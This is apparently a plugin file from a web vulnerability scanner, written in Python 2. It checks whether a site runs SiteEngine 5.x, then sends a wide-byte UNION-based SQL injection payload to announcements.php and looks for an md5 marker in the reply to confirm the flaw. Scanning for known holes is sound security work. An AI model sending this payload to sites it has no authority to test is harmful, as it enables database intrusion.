#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''  
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"admin/images/css.css")
        url+="announcements.php?id=1%bf%27%20and%201=2%20%20UNION%20select%201,2,md5(8888),4,5,6,7,8,9,10,11%20/*"
        r,c=requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        if c.find("siteengine")>=0:
            res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
            if res['status'] == '200' and (content.find('cf79ae6addba60ad018347359bd144d2')>=0 or content.find("ddba60ad01834735")>=0):
                request = getRequest(url)
                response = getResponse(res)
                list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:SITEENGINE5.xSQLINJECITONSCRIPT.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:SITEENGINE5.xSQLINJECITONSCRIPT.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def